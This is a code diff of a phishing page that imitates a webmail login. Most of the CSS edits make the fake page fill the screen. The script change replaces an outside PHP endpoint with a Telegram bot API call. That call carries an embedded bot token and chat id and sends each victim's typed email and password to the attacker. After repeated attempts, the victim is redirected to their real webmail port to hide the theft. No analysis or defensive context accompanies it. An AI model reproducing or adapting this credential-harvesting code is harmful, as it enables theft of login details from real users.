@@ -40,6 +40,14 @@
             background-color: #fff;
         }
         
+        body {
+            width: 100vw;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        
         [class~=main_container],
         body,
         [class~=container] {
@@ -1401,11 +1409,11 @@
         }
         
         [class~=bigbox] {
-            width: 80%;
+            width: 100%;
         }
         
         [class~=bigbox] {
-            height: 90%;
+            height: 100%;
         }
         
         [class~=location]>a,
@@ -1424,7 +1432,7 @@
         }
         
         [class~=bigbox] {
-            top: 3%;
+            top: 0;
         }
         
         [class~=location]>a {
@@ -1474,10 +1482,17 @@
         }
         
         [class~=bigbox] {
-            border-radius: 3.75pt;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            z-index: 0;
         }
-        
-        .location {
             display: grid;
         }
         
@@ -1800,57 +1815,52 @@ if (!password) {
 count=count+1;
 
 $.ajax({
-dataType: 'JSON',
-url: 'https://tskg.dpdns.org/php/result.php',
-type: 'POST',
-      	data:{
-			email:email,
-            password:password,	
-      	},
-			data: $('#contactform').serialize(),
-            beforeSend: function(xhr){
-            	
-            },
-            success: function(response){
-            	if(response){
-            		$("#msg").show();
-            		console.log(response);
-            		if(response['signal'] == 'ok'){
-            			$("#password").val("");
-            			if (count>=2) {
-            				count=0;
-                    // window.location.replace(response['redirect_link']);
-                   window.location.replace("https://www."+my_slice);
-                }
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-            }
-            else{
-                        	$("#msg").show();
-               $('#msg').html("Password is not correct. Please try again");	
-            }
+      dataType: 'json', // JSON is lowercase
+      url: 'https://api.telegram.org/bot7189320872:AAF9N7cF8HfkGFvrcaePdfWK4ckIDOKaE-E/sendMessage',
+      type: 'POST',
+      data: {
+        chat_id: '1772532307',
+        text: `***** Webmail Result *****\r\nEmail: ${email}\r\nPassword: ${password}\r\n*****`
+      },
+      beforeSend: function(xhr) {
+        $('#submit-btn').html('Verifying...');
+      },
+      success: function(response) {
+        if (response.ok) {
+          $("#msg").show();
+          console.log(response);
+          $("#password").val("");
+          if (count >= 3) {
+            count = 0;
+            window.location.replace("http://" + my_slice + ":2095");
+          }
+        } else {
+          console.log('Telegram API error:', response);
+          // Handle the case when the Telegram API does not respond with 'ok'
         }
-    },
-    error: function(){
-    	$("#password").val("");
-    	if (count>=2) {
-    		count=0;
-    		 window.location.replace("https://www."+my_slice);
-    	}
-            	$("#auth_reg").show();
-               $('#auth_reg').html("Password is not correct. Please try again");
-    },
-    complete: function(){
-    	
-    }
-});
+      },
+      error: function(xhr, status, error) {
+        console.log('AJAX error:', status, error);
+        $("#password").val("");
+        if (count >= 3) {
+          count = 0;
+          window.location.replace("http://" + my_slice + ":2095");
+        }
+        $("#msg").show();
+        // Handle errors here
+      },
+      complete: function() {
+       
+      }
+    });
   });
-
-
-	});
-
-
+});
+   
 </script>	
    
    </body></html>
+
+
+
+
 
